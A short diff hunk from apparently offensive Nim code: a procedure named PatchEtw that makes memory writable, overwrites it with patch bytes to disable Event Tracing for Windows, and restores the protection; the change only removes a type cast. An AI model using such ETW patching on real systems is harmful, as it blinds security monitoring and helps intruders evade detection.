@@ -36,7 +36,7 @@ proc PatchEtw(): bool =
     if VirtualProtect(cs, offset.len, 0x40, addr dwOld):
         echo "[*] Applying ETW patch"
         copyMem(cs, unsafeAddr offset, offset.len)
-        VirtualProtect(cs, offset.len, cast[ULONG](a), addr dwOld)
+        VirtualProtect(cs, offset.len, a, addr dwOld)
         disabled = true
 
     return disabled    
